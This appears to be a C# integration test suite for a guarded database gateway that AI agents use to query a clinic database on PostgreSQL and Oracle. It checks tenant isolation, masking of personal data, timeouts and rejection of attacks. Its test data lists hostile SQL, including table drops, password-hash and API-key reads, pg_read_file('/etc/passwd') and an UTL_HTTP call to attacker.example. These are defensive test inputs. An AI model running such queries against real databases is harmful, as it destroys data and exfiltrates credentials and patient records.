using System.Data.Common;
using System.Diagnostics;
using System.Text.Json;
using GuardedDbMcp.Audit;
using GuardedDbMcp.Demo;
using GuardedDbMcp.Execution;
using GuardedDbMcp.Sql;
using GuardedDbMcp.UnitTests;

namespace GuardedDbMcp.IntegrationTests;

/// <summary>The same guarantees, proven against real PostgreSQL 17 and Oracle 23ai Free.</summary>
public abstract class EngineContractTests(IEngineFixture fixture)
{
    private static CancellationToken Ct => TestContext.Current.CancellationToken;

    private string T(string name) => fixture.Dialect.Fold(name);

    [Fact]
    public async Task Row_policy_limits_every_query_to_the_principals_clinic()
    {
        var service = fixture.CreateService(new InMemoryAuditSink());
        var expected = fixture.Data.Patients.Count(p => p.ClinicId == 1);

        var plain = await service.QueryAsync(Defaults.Clinic1, "SELECT COUNT(*) FROM patients", null, Ct);
        var widened = await service.QueryAsync(Defaults.Clinic1, "SELECT COUNT(*) FROM patients p WHERE p.clinic_id = 2 OR 1 = 1", null, Ct);
        var viaUnion = await service.QueryAsync(Defaults.Clinic1, "SELECT clinic_id FROM patients UNION SELECT clinic_id FROM appointments", null, Ct);
        var viaJoin = await service.QueryAsync(Defaults.Clinic1,
            "SELECT COUNT(*) FROM appointments a JOIN patients p ON p.id = a.patient_id WHERE a.clinic_id <> 1", null, Ct);

        Convert.ToInt64(plain.Rows[0][0], System.Globalization.CultureInfo.InvariantCulture).Should().Be(expected);
        Convert.ToInt64(widened.Rows[0][0], System.Globalization.CultureInfo.InvariantCulture).Should().Be(expected);
        viaUnion.Rows.Select(r => Convert.ToInt64(r[0], System.Globalization.CultureInfo.InvariantCulture)).Should().Equal(1L);
        Convert.ToInt64(viaJoin.Rows[0][0], System.Globalization.CultureInfo.InvariantCulture).Should().Be(0);
    }

    [Fact]
    public async Task Personal_data_never_leaves_unmasked()
    {
        var service = fixture.CreateService(new InMemoryAuditSink());
        string[] queries =
        [
            "SELECT * FROM patients",
            "SELECT id, tckn AS t, UPPER(email) AS e, phone FROM patients",
            "SELECT p.full_name, i.iban, i.amount FROM invoices i JOIN appointments a ON a.id = i.appointment_id JOIN patients p ON p.id = a.patient_id",
            "SELECT notes FROM appointments WHERE notes IS NOT NULL",
            "SELECT * FROM staff",
        ];

        foreach (var sql in queries)
        {
            var response = await service.QueryAsync(Defaults.Clinic1, sql, null, Ct);
            response.Ok.Should().BeTrue($"{sql}: {response.Message}");
            response.RowCount.Should().BeGreaterThan(0);
            Scenarios.Leak(JsonSerializer.Serialize(response)).Should().BeNull(sql);
        }
    }

    [Fact]
    public async Task Pseudonyms_are_stable_so_agents_can_still_count_distinct_people()
    {
        var service = fixture.CreateService(new InMemoryAuditSink());

        var response = await service.QueryAsync(Defaults.Clinic1, "SELECT full_name FROM patients ORDER BY id", null, Ct);
        var again = await service.QueryAsync(Defaults.Clinic1, "SELECT full_name FROM patients ORDER BY id", null, Ct);

        response.Rows.Select(r => (string)r[0]!).Should().OnlyContain(n => n.StartsWith("person_", StringComparison.Ordinal));
        response.Rows.Select(r => r[0]).Should().Equal(again.Rows.Select(r => r[0]));
    }

    [Fact]
    public async Task Free_text_personal_data_and_injection_payloads_are_handled()
    {
        var service = fixture.CreateService(new InMemoryAuditSink());

        var response = await service.QueryAsync(Defaults.Clinic1, "SELECT id, notes FROM appointments WHERE notes LIKE 'Hasta %' OR notes LIKE 'SYSTEM%'", null, Ct);

        response.Ok.Should().BeTrue(response.Message);
        response.DetectedInValues.Should().ContainKey("NationalId").And.ContainKey("Phone");
        response.Warnings.Should().Contain(w => w.Contains("instructions", StringComparison.Ordinal));
    }

    [Fact]
    public async Task Results_are_capped_and_truncation_is_reported()
    {
        var service = fixture.CreateService(new InMemoryAuditSink());

        var response = await service.QueryAsync(Defaults.Clinic1, "SELECT id FROM appointments", null, Ct);

        response.RowCount.Should().Be(fixture.Guard.Policy.Limits.MaxRows);
        response.Truncated.Should().BeTrue();
    }

    [Fact]
    public async Task Runaway_queries_are_cancelled_by_the_statement_timeout()
    {
        var audit = new InMemoryAuditSink();
        var service = fixture.CreateService(audit);
        var watch = Stopwatch.StartNew();

        var response = await service.QueryAsync(
            Defaults.Clinic1, "SELECT COUNT(*) FROM appointments a CROSS JOIN appointments b CROSS JOIN appointments c", null, Ct);

        response.Error.Should().Be("StatementTimeout", response.Message);
        watch.Elapsed.Should().BeLessThan(TimeSpan.FromSeconds(15));
        audit.Records.Single().Outcome.Should().Be(AuditOutcome.Failed);
    }

    [Fact]
    public async Task Attack_catalogue_is_rejected_end_to_end_without_reaching_the_database()
    {
        var audit = new InMemoryAuditSink();
        var service = fixture.CreateService(audit);
        var attacks = AttackCatalog.Rejected.Where(a => a.Dialect == fixture.Dialect).ToList();

        foreach (var attack in attacks)
        {
            var response = await service.QueryAsync(Defaults.Clinic1, attack.Sql, null, Ct);
            response.Ok.Should().BeFalse(attack.Id);
            response.Error.Should().Be(attack.Expected.ToString(), attack.Id);
        }

        audit.Records.Should().HaveCount(attacks.Count).And.OnlyContain(r => r.Outcome == AuditOutcome.Rejected && r.ExecutedSql == null);
        AuditVerifier.Verify(audit.Entries).Valid.Should().BeTrue();
    }

    [Fact]
    public async Task The_read_only_transaction_blocks_writes_even_for_a_privileged_login()
    {
        var write = new RenderedSql($"UPDATE {T("clinic")}.{T("clinics")} SET {T("name")} = 'pwned'", []);

        var act = () => fixture.OwnerExecutor.ExecuteAsync(write, new ExecutionLimits(10, TimeSpan.FromSeconds(5)), Ct);

        await act.Should().ThrowAsync<DbException>();
    }

    [Theory]
    // Each engine class supplies its own RawAttacks data (resolved on the concrete test class).
    [MemberData("RawAttacks")]
    public async Task The_reader_account_refuses_what_the_guard_refuses(string sql)
    {
        // Second line of defence: the guard is bypassed entirely and the SQL goes straight to the reader login.
        var act = () => fixture.ExecuteRawAsReaderAsync(sql);
        await act.Should().ThrowAsync<DbException>(sql);
    }
}

[Collection("postgres")]
public sealed class PostgresContractTests(PostgresFixture fixture) : EngineContractTests(fixture)
{
    public static TheoryData<string> RawAttacks() =>
    [
        "INSERT INTO clinic.clinics VALUES (99, 'x', 'y')",
        "DELETE FROM clinic.patients",
        "DROP TABLE clinic.patients",
        "CREATE TABLE clinic.stolen AS SELECT * FROM clinic.patients",
        "SELECT * FROM clinic.internal_api_keys",
        "SELECT password_hash FROM clinic.staff",
        "SET default_transaction_read_only = off; UPDATE clinic.clinics SET name = 'x'",
        "SELECT pg_read_file('/etc/passwd')",
        "SELECT lo_import('/etc/passwd')",
        "COPY clinic.patients TO '/tmp/patients.csv'",
        "CREATE TEMP TABLE t AS SELECT 1",
    ];
}

[Collection("oracle")]
public sealed class OracleContractTests(OracleFixture fixture) : EngineContractTests(fixture)
{
    public static TheoryData<string> RawAttacks() =>
    [
        "INSERT INTO clinic.clinics VALUES (99, 'x', 'y')",
        "DELETE FROM clinic.patients",
        "DROP TABLE clinic.patients",
        "SELECT * FROM clinic.internal_api_keys",
        "SELECT password_hash FROM clinic.staff_accounts",
        "SELECT password_hash FROM clinic.staff",
        "CREATE TABLE stolen AS SELECT * FROM clinic.patients",
        "SELECT UTL_HTTP.REQUEST('http://attacker.example/') FROM dual",
    ];
}
